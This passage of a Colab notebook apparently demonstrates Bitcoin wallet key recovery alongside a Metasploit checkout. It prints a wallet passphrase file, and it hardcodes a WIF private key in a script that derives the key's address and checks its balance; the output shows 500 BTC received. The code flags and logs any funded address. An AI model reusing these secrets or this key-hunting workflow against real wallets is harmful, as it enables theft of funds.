            "docker-compose.override.yml  \u001b[01;32mmsfconsole\u001b[0m*                   \u001b[01;34mtest\u001b[0m/\n",
            "docker-compose.yml           \u001b[01;32mmsfd\u001b[0m*                         \u001b[01;34mtools\u001b[0m/\n",
            "Dockerfile                   \u001b[01;32mmsfdb\u001b[0m*                        Vagrantfile\n",
            "\u001b[01;34mdocs\u001b[0m/                        msf-json-rpc.ru               walletpassphrase.txt\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "cat walletpassphrase.txt"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "hCbRfZ2kvhQh",
        "outputId": "dd0a53ee-1efa-41d3-e358-71c1d7c279cc"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "walletpassphrase 1111000101000001111101110000011101000000101110101101011110100100000101010001100101100101001010001110001111100000110111110110000011011011010111101111111010001000001111000110010101000111011101000101000011000100011011001000100111110001110010011001001100111000 60\n",
            "\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!pip3 install bitcoin"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "wqOsp0rJxtKw",
        "outputId": "60c1a19a-856c-4e8f-b951-cc2b1373ba48"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Collecting bitcoin\n",
            "  Downloading bitcoin-1.1.42.tar.gz (36 kB)\n",
            "  Preparing metadata (setup.py) ... \u001b[?25l\u001b[?25hdone\n",
            "Building wheels for collected packages: bitcoin\n",
            "  Building wheel for bitcoin (setup.py) ... \u001b[?25l\u001b[?25hdone\n",
            "  Created wheel for bitcoin: filename=bitcoin-1.1.42-py3-none-any.whl size=44402 sha256=a3153bb474d34b3d7208e7fd94d8b11d9e804c679a9d81642ad9686c3f8e28cb\n",
            "  Stored in directory: /root/.cache/pip/wheels/a3/98/a1/0d53f5b714680bb5dffc2db778c221b1f5c54bc4a3a779c8c5\n",
            "Successfully built bitcoin\n",
            "Installing collected packages: bitcoin\n",
            "Successfully installed bitcoin-1.1.42\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "from bitcoin import *\n",
        "import sys\n",
        "import re\n",
        "import json\n",
        "from time import sleep\n",
        "\n",
        "try:    # if is python3\n",
        "    from urllib.request import urlopen\n",
        "except: # if is python2\n",
        "    from urllib2 import urlopen\n",
        "\n",
        "def get_address_from_private_key(private_key_wif):\n",
        "    # decode WIF private key\n",
        "    private_key = decode_privkey(private_key_wif)\n",
        "\n",
        "    # get the public key from the private one\n",
        "    public_key = privtopub(private_key)\n",
        "\n",
        "    # get bitcoin address from public key\n",
        "    address = pubtoaddr(public_key)\n",
        "\n",
        "    return address\n",
        "\n",
        "def check_balance(address):\n",
        "\n",
        "    #Modify the value of the variable below to False if you do not want Bell Sound when the Software finds balance.\n",
        "    SONG_BELL = True\n",
        "\n",
        "    #Add time different of 0 if you need more security on the checks\n",
        "    WARN_WAIT_TIME = 0\n",
        "\n",
        "    blockchain_tags_json = [\n",
        "        'total_received',\n",
        "        ]\n",
        "\n",
        "    SATOSHIS_PER_BTC = 1e+8\n",
        "\n",
        "    check_address = address\n",
        "\n",
        "    parse_address_structure = re.match(r' *([a-zA-Z1-9]{1,34})', check_address)\n",
        "    if ( parse_address_structure is not None ):\n",
        "        check_address = parse_address_structure.group(1)\n",
        "    else:\n",
        "        #print( \"\\nThis Bitcoin Address is invalid\" + check_address )\n",
        "        exit(1)\n",
        "\n",
        "    #Read info from Blockchain about the Address\n",
        "    reading_state=1\n",
        "    while (reading_state):\n",
        "        try:\n",
        "            htmlfile = urlopen(\"https://blockchain.info/address/%s?format=json\" % check_address, timeout = 10)\n",
        "            htmltext = htmlfile.read().decode('utf-8')\n",
        "            reading_state  = 0\n",
        "        except:\n",
        "            reading_state+=1\n",
        "            print( \"Checking... \" + str(reading_state) )\n",
        "            sleep(60*reading_state)\n",
        "\n",
        "    #print( \"\\nBitcoin Address = \" + check_address )\n",
        "\n",
        "    blockchain_info_array = []\n",
        "    tag = ''\n",
        "    try:\n",
        "        for tag in blockchain_tags_json:\n",
        "            blockchain_info_array.append (\n",
        "                float( re.search( r'%s\":(\\d+),' % tag, htmltext ).group(1) ) )\n",
        "    except:\n",
        "        print( \"Error '%s'.\" % tag );\n",
        "        exit(1)\n",
        "\n",
        "    for i, btc_tokens in enumerate(blockchain_info_array):\n",
        "\n",
        "        sys.stdout.write (\"%s \\t= \" % blockchain_tags_json[i])\n",
        "        if btc_tokens > 0.0:\n",
        "            print( \"%.8f Bitcoin\" % (btc_tokens/SATOSHIS_PER_BTC) );\n",
        "        else:\n",
        "            print( \"0 Bitcoin\" );\n",
        "\n",
        "        if (SONG_BELL and blockchain_tags_json[i] == 'final_balance' and btc_tokens > 0.0):\n",
        "\n",
        "            #If you have a balance greater than 0 you will hear the bell\n",
        "            sys.stdout.write ('\\a\\a\\a')\n",
        "            sys.stdout.flush()\n",
        "\n",
        "            with open('balance.json', 'a') as arq1:\n",
        "                arq1.write(\"Bitcoin Address: %s\" % check_address)\n",
        "                arq1.write(\"\\t Balance: %.8f Bitcoin\" % (btc_tokens/SATOSHIS_PER_BTC))\n",
        "                arq1.write(\"\\n\")\n",
        "\n",
        "            if (WARN_WAIT_TIME > 0):\n",
        "                sleep(WARN_WAIT_TIME)\n",
        "\n",
        "# enter your private key in WIF format\n",
        "private_key_wif = \"5KA4spokBSZ7d5QpcuJ3eTDhNJUhfJoQAUovffQWBym3LP3CKTz\"\n",
        "\n",
        "# get bitcoin address\n",
        "bitcoin_address = get_address_from_private_key(private_key_wif)\n",
        "print (\"__________________________________________________\\n\")\n",
        "print(f\"Private Key WIF: {private_key_wif}\")\n",
        "print(f\"Bitcoin Address: {bitcoin_address}\")\n",
        "\n",
        "check_balance(bitcoin_address)\n",
        "print (\"__________________________________________________\\n\")"
      ],
      "metadata": {
        "id": "9Q_ot1kDx0d1",
        "outputId": "bc23cc95-b404-4529-f389-0f65f1b8dcd0",
        "colab": {
          "base_uri": "https://localhost:8080/"
        }
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "__________________________________________________\n",
            "\n",
            "Private Key WIF: 5KA4spokBSZ7d5QpcuJ3eTDhNJUhfJoQAUovffQWBym3LP3CKTz\n",
            "Bitcoin Address: 1GjjGLYR7UhtM1n6z7QDpQskBicgmsHW9k\n",
            "total_received \t= 500.09702252 Bitcoin\n",
            "__________________________________________________\n",
            "\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Bitaddress: https://cryptodeep.ru/bitaddress.html\n",
        "\n",
        "\n",
        "\n",
        "---\n",
        "\n"
      ],
      "metadata": {
        "id": "46LyyuOBuvez"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "\n",
        "\n",
        "\n",
        "![image.png](data:image/png;base64,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